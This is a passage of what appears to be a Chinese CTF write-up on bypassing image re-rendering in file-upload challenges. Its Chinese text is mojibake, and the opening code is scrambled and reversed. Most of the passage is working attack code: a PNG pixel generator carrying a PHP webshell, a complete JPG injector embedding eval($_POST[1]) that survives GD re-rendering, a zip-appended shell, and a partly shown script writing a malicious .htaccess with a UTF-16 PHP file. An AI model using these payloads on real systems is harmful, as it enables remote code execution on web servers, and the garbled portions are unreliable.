class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;æ–‡ä»¶è¶…è¿‡1024KB&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">*/</span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-10-27 17:14:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">&lt;?phpXï¿½ï¿½ï¿½ï¿½s^7ï¿½ï¿½ï¿½ï¿½ï¿½~_ï¿½&#125;ï¿½&#x27;ï¿½ï¿½ï¿½É¿_ï¿½|ï¿½00cÙ¹gï¿½ï¿½=ï¿½2ï¿½ï¿½Q0</span></span><br><span class="line"><span class="comment">Fï¿½(ï¿½`ï¿½ï¿½Q0</span></span><br><span class="line"><span class="comment">ï¿½</span></span><br><span class="line"><span class="comment">else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span></span><br><span class="line"><span class="comment">            $im = imagecreatefromgif($target_path);</span></span><br><span class="line"><span class="comment">            if($im == false)&#123;</span></span><br><span class="line"><span class="comment">                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;</span></span><br><span class="line"><span class="comment">                <span class="doctag">@unlink</span>($target_path);</span></span><br><span class="line"><span class="comment">            &#125;else&#123;</span></span><br><span class="line"><span class="comment">                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line"><span class="comment">                srand(time());</span></span><br><span class="line"><span class="comment">                $newfilename = strval(rand()).&quot;.gif&quot;;</span></span><br><span class="line"><span class="comment">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line"><span class="comment">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span></span><br><span class="line"><span class="comment">                imagegif($im,$img_path);</span></span><br><span class="line"><span class="comment">                <span class="doctag">@unlink</span>($target_path);</span></span><br><span class="line"><span class="comment">                $is_upload = true;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">    &#125;else&#123;</span></span><br><span class="line"><span class="comment">        $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br></pre></td></tr></table></figure><h4 id="pngæ¸²æŸ“è„šæœ¬"><a href="#pngæ¸²æŸ“è„šæœ¬" class="headerlink" title="pngæ¸²æŸ“è„šæœ¬"></a>pngæ¸²æŸ“è„šæœ¬</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);  <span class="comment">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span></span><br><span class="line"><span class="comment">/* æœ¨é©¬å†…å®¹</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="7.png" alt="image-20211207121139351"></p><h4 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h4><p>æ„æˆæ¼æ´çš„ä»£ç ï¼š</p><blockquote><p>$jpg = imagecreatefromjpeg($_FILES[â€œfileâ€][â€œtmp_nameâ€]);</p></blockquote><p>å¦‚æœæˆ‘ä»¬æ­£å¸¸ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œå‘åŒ…åå‡ºç°ATOR: gd-jpeg v1.0 (using IJG JPEG v80), default qualityï¼Œè¯´æ˜å­˜åœ¨jpgäºŒæ¬¡æ¸²æŸ“</p><p>è¿™å¼ æ˜¯æ¯”è¾ƒå¥½ç”¨çš„jpgäºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡</p><p><img src="8.jpg" alt="jpgäºŒæ¬¡æ¸²æŸ“ä¸“ç”¨"></p><p>ä½¿ç”¨æ–¹æ³•ï¼Œå…ˆä¸Šä¼ è¿™å¼ å›¾ç‰‡</p><p>æˆåŠŸä¸Šä¼ åï¼Œä¸‹è½½å›¾ç‰‡å¦å­˜ä¸º2.jpg</p><p>ä¸ºä»€ä¹ˆç”¨2.jpgè¿›è¡Œæ¸²æŸ“ï¼Œå› ä¸º2.jpgæ˜¯å·²ç»ç»è¿‡æ¸²æŸ“è¿‡çš„ï¼Œå¦‚æœæˆ‘ä»¬å†æ¬¡ä¸Šä¼ ï¼Œæ”¹åŠ¨çš„å°ä¸€ç‚¹ï¼ŒæˆåŠŸæ€§é«˜ä¸€ç‚¹</p><p>æ¸²æŸ“è„šæœ¬ php index.php 2.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆpayload_2.jpgï¼Œä¸Šä¼ è¿™å¼ å›¾ç‰‡ï¼Œç„¶åå³å¯æ‰§è¡Œå‘½ä»¤</p><h3 id="ä¸Šä¼ zip"><a href="#ä¸Šä¼ zip" class="headerlink" title="ä¸Šä¼ zip"></a>ä¸Šä¼ zip</h3><p><img src="8.png" alt="image-20211207135754757"></p><p>å°†imageæ”¹ä¸ºfileï¼Œä¸Šä¼ zipï¼Œåœ¨zipçš„ç»“å°¾æ·»åŠ &lt;?php eval($_POST[1]);?&gt;</p><h3 id="ä¸Šä¼ -htaccess"><a href="#ä¸Šä¼ -htaccess" class="headerlink" title="ä¸Šä¼ .htaccess"></a>ä¸Šä¼ .htaccess</h3><h3 id="å¦‚æœåŸæ¥ä½¿ç”¨utf8ç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨utf16ç»•è¿‡"><a href="#å¦‚æœåŸæ¥ä½¿ç”¨utf8ç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨utf16ç»•è¿‡" class="headerlink" title="å¦‚æœåŸæ¥ä½¿ç”¨utf8ç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨utf16ç»•è¿‡"></a>å¦‚æœåŸæ¥ä½¿ç”¨utf8ç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨utf16ç»•è¿‡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¦‚æœåŸæ¥ä½¿ç”¨utf8ç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨utf16ç»•è¿‡</span></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line">    phpfile.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .lethe\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line">    